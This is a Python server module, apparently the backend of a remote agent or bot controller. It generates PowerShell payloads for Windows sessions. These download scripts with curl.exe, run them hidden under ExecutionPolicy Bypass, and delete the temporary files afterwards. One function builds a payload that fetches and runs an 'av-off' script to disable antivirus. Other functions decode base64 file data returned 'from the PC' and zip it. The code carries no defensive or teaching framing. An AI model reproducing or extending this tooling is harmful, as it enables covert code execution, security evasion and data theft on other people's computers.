from __future__ import annotations

import base64
import io
import re
import zipfile
from typing import Any

from app import store
from app.tools_catalog import TOOLS, TOOLS_BY_ID


def _files_base() -> str:
    return f"{store.effective_base_url().rstrip('/')}/files"


def tool_download_url(rel_path: str) -> str:
    rel = rel_path.lstrip("/").replace("\\", "/")
    return f"{_files_base()}/tools/{rel}"


def _q(s: str) -> str:
    return "'" + s.replace("'", "''") + "'"


def _short_runner(tool_id: str | None = None, *, all_tools: bool = False) -> str:
    """Curl script on PC; result via TEMP file (Hidden PS has no console → FILEB64 lost)."""
    files = _files_base()
    if all_tools:
        script = f"{files}/scripts/export-tools.ps1"
        tool_env = ""
    else:
        if not tool_id or tool_id not in TOOLS_BY_ID:
            raise ValueError(f"outil inconnu: {tool_id}")
        script = f"{files}/scripts/run-tool.ps1"
        tool_env = f"$env:AGENTSHE_TOOL_ID={_q(tool_id)}\n"
    return f"""
$ErrorActionPreference='SilentlyContinue'
try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
$files={_q(files)}
$env:AGENTSHE_FILES=$files
{tool_env}$res=Join-Path $env:TEMP ('hh-res-'+[guid]::NewGuid().ToString('n')+'.txt')
$env:AGENTSHE_RESULT_FILE=$res
$tmp=Join-Path $env:TEMP ('hh-run-'+[guid]::NewGuid().ToString('n')+'.ps1')
& curl.exe -fsSL {_q(script)} -o $tmp
if(-not(Test-Path $tmp)){{throw 'script download failed'}}
& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp | Out-Null
$out=''
if(Test-Path -LiteralPath $res){{ $out=[IO.File]::ReadAllText($res) }}
if(-not $out){{ $out = (& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmp | Out-String -Width 4096) }}
Remove-Item $tmp,$res -Force -EA SilentlyContinue
if(-not $out){{throw 'pas de sortie outil'}}
Write-Output $out
""".strip()


def build_av_off_ps() -> str:
    files = _files_base()
    script = f"{files}/scripts/av-off.ps1"
    return f"""
$ErrorActionPreference='SilentlyContinue'
try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
$files={_q(files)}
$env:AGENTSHE_FILES=$files
$env:AGENTSHE_BOT_BASE=($files -replace '/files$','')
$tmp=Join-Path $env:TEMP ('hh-avoff-'+[guid]::NewGuid().ToString('n')+'.ps1')
& curl.exe -fsSL {_q(script)} -o $tmp
if(-not(Test-Path $tmp)){{throw 'av-off download failed'}}
$o=& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp 2>&1 | Out-String -Width 2147483647
Write-Output $o
Remove-Item $tmp -Force -EA SilentlyContinue
""".strip()


def build_tool_ps(tool_id: str, *, prefer_x64: bool = True) -> str:
    _ = prefer_x64
    return _short_runner(tool_id)


def build_all_tools_ps() -> str:
    return _short_runner(all_tools=True)


_FILE_RE = re.compile(
    r"FILEB64:([^:\r\n]+):([A-Za-z0-9+/=\r\n\t ]+)",
    re.DOTALL,
)


def parse_file_b64(output: str) -> tuple[str, bytes]:
    text = output or ""
    matches = list(_FILE_RE.finditer(text))
    if not matches:
        raise ValueError("pas de fichier renvoyé par le PC")
    m = matches[-1]
    name = m.group(1).strip()
    b64 = re.sub(r"\s+", "", m.group(2))
    if "ERRS:" in b64:
        b64 = b64.split("ERRS:", 1)[0]
    try:
        return name, base64.b64decode(b64, validate=False)
    except Exception as e:
        raise ValueError(f"fichier corrompu ({name}): {e}") from e


def zip_tool_files(files: list[tuple[str, bytes]]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, data in files:
            zf.writestr(name, data)
    return buf.getvalue()


def is_windows_session(session: dict[str, Any]) -> bool:
    platform = (session.get("platform") or "").lower()
    agent = session.get("agent") or {}
    if not platform or platform == "any":
        platform = (agent.get("platform") or "").lower()
    return platform in ("windows", "win", "windows_nt")
